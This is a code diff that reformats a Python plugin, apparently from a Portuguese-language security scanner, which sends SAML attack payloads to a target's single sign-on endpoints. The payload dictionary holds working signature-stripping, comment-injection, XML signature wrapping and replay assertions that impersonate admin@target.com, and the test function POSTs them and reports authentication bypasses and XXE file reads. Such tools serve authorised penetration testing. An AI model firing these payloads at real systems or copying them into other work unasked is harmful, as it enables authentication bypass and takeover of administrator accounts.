@@ -1,15 +1,24 @@
 # plugins/saml_scanner.py — Cascavel 2026 Intelligence
-import requests
 import base64
 
+import requests
 
 SAML_ENDPOINTS = [
-    "/saml/SSO", "/saml2/SSO", "/adfs/ls/", "/simplesaml/",
-    "/auth/realms/master/protocol/saml", "/sso/saml",
-    "/saml/metadata", "/saml2/metadata",
+    "/saml/SSO",
+    "/saml2/SSO",
+    "/adfs/ls/",
+    "/simplesaml/",
+    "/auth/realms/master/protocol/saml",
+    "/sso/saml",
+    "/saml/metadata",
+    "/saml2/metadata",
     "/FederationMetadata/2007-06/FederationMetadata.xml",
-    "/saml/login", "/saml2/login", "/saml/acs", "/saml2/acs",
-    "/auth/saml/callback", "/api/auth/saml",
+    "/saml/login",
+    "/saml2/login",
+    "/saml/acs",
+    "/saml2/acs",
+    "/auth/saml/callback",
+    "/api/auth/saml",
 ]
 
 # ──────────── SAML ATTACK PAYLOADS (2026 Expanded) ────────────
@@ -25,22 +34,40 @@ SAML_ATTACKS = {
         "severity": "ALTO",
     },
     "SIGNATURE_STRIP": {
-        "payload": '<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>',
+        "payload": (
+            "<samlp:Response><saml:Assertion><saml:Subject>"
+            "<saml:NameID>admin@target.com</saml:NameID>"
+            "</saml:Subject></saml:Assertion></samlp:Response>"
+        ),
         "detect": ["dashboard", "admin", "welcome", "session"],
         "severity": "CRITICO",
     },
     "COMMENT_INJECTION": {
-        "payload": '<saml:NameID>admin@target.com<!-->.evil.com</saml:NameID>',
+        "payload": "<saml:NameID>admin@target.com<!-->.evil.com</saml:NameID>",
         "detect": ["admin", "session", "token"],
         "severity": "CRITICO",
     },
     "XSW_ATTACK": {
-        "payload": '<samlp:Response><saml:Assertion ID="evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID="legit"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>',
+        "payload": (
+            '<samlp:Response><saml:Assertion ID="evil">'
+            "<saml:Subject><saml:NameID>admin@target.com</saml:NameID>"
+            "</saml:Subject></saml:Assertion>"
+            '<saml:Assertion ID="legit"><saml:Subject>'
+            "<saml:NameID>user@target.com</saml:NameID>"
+            "</saml:Subject></saml:Assertion></samlp:Response>"
+        ),
         "detect": ["admin", "welcome"],
         "severity": "CRITICO",
     },
     "SAML_REPLAY": {
-        "payload": '<samlp:Response IssueInstant="2020-01-01T00:00:00Z"><saml:Assertion><saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2020-01-01T01:00:00Z"/><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>',
+        "payload": (
+            '<samlp:Response IssueInstant="2020-01-01T00:00:00Z">'
+            "<saml:Assertion>"
+            '<saml:Conditions NotBefore="2020-01-01T00:00:00Z"'
+            ' NotOnOrAfter="2020-01-01T01:00:00Z"/>'
+            "<saml:Subject><saml:NameID>admin@target.com</saml:NameID>"
+            "</saml:Subject></saml:Assertion></samlp:Response>"
+        ),
         "detect": ["session", "token", "admin"],
         "severity": "ALTO",
     },
@@ -53,10 +80,12 @@ def _check_saml_endpoints(target):
     for endpoint in SAML_ENDPOINTS:
         try:
             resp = requests.get(f"http://{target}{endpoint}", timeout=8)
-            if resp.status_code == 200 and any(k in resp.text.lower() for k in
-                                                ["saml", "entityid", "singlesignonservice", "idp"]):
+            if resp.status_code == 200 and any(
+                k in resp.text.lower() for k in ["saml", "entityid", "singlesignonservice", "idp"]
+            ):
                 vuln = {
-                    "tipo": "SAML_ENDPOINT_EXPOSED", "endpoint": endpoint,
+                    "tipo": "SAML_ENDPOINT_EXPOSED",
+                    "endpoint": endpoint,
                     "severidade": "MEDIO",
                     "descricao": "Endpoint SAML exposto — metadata acessível",
                 }
@@ -74,8 +103,7 @@ def _check_saml_endpoints(target):
 def _test_saml_attacks(target):
     """Testa ataques SAML avançados."""
     vulns = []
-    test_endpoints = ["/saml/SSO", "/saml2/SSO", "/adfs/ls/", "/saml/acs",
-                       "/saml2/acs", "/auth/saml/callback"]
+    test_endpoints = ["/saml/SSO", "/saml2/SSO", "/adfs/ls/", "/saml/acs", "/saml2/acs", "/auth/saml/callback"]
 
     for attack_name, attack_data in SAML_ATTACKS.items():
         for endpoint in test_endpoints:
@@ -86,37 +114,46 @@ def _test_saml_attacks(target):
                     f"http://{target}{endpoint}",
                     data={"SAMLResponse": encoded, "RelayState": "/"},
                     headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    timeout=8, allow_redirects=False,
+                    timeout=8,
+                    allow_redirects=False,
                 )
 
                 # Check for XXE
                 if attack_name.startswith("XXE") and any(d in resp.text for d in attack_data["detect"]):
-                    vulns.append({
-                        "tipo": "SAML_XXE", "endpoint": endpoint,
-                        "severidade": "CRITICO",
-                        "descricao": "XXE via SAML Response — file read confirmado!",
-                    })
+                    vulns.append(
+                        {
+                            "tipo": "SAML_XXE",
+                            "endpoint": endpoint,
+                            "severidade": "CRITICO",
+                            "descricao": "XXE via SAML Response — file read confirmado!",
+                        }
+                    )
 
                 # Check for auth bypass
                 if attack_name in ("SIGNATURE_STRIP", "COMMENT_INJECTION", "XSW_ATTACK"):
                     if resp.status_code in (200, 302):
                         location = resp.headers.get("Location", "")
-                        if any(d in location.lower() or d in resp.text.lower()
-                               for d in attack_data["detect"]):
-                            vulns.append({
-                                "tipo": f"SAML_{attack_name}", "endpoint": endpoint,
-                                "severidade": attack_data["severity"],
-                                "descricao": f"SAML {attack_name} — auth bypass!",
-                            })
+                        if any(d in location.lower() or d in resp.text.lower() for d in attack_data["detect"]):
+                            vulns.append(
+                                {
+                                    "tipo": f"SAML_{attack_name}",
+                                    "endpoint": endpoint,
+                                    "severidade": attack_data["severity"],
+                                    "descricao": f"SAML {attack_name} — auth bypass!",
+                                }
+                            )
 
                 # Replay attack
                 if attack_name == "SAML_REPLAY" and resp.status_code in (200, 302):
                     if "expired" not in resp.text.lower() and "invalid" not in resp.text.lower():
-                        vulns.append({
-                            "tipo": "SAML_REPLAY_ACCEPTED", "endpoint": endpoint,
-                            "severidade": "ALTO",
-                            "descricao": "SAML assertion com timestamp expirado aceita — replay attack!",
-                        })
+                        vulns.append(
+                            {
+                                "tipo": "SAML_REPLAY_ACCEPTED",
+                                "endpoint": endpoint,
+                                "severidade": "ALTO",
+                                "descricao": "SAML assertion com timestamp expirado aceita — replay attack!",
+                            }
+                        )
 
             except Exception:
                 continue
@@ -140,7 +177,14 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "saml_scanner",
         "versao": "2026.1",
-        "tecnicas": ["xxe", "xxe_blind", "signature_strip", "comment_injection",
-                      "xsw_attack", "replay_attack", "cert_disclosure"],
+        "tecnicas": [
+            "xxe",
+            "xxe_blind",
+            "signature_strip",
+            "comment_injection",
+            "xsw_attack",
+            "replay_attack",
+            "cert_disclosure",
+        ],
         "resultados": vulns if vulns else "Nenhuma falha SAML detectada",
     }
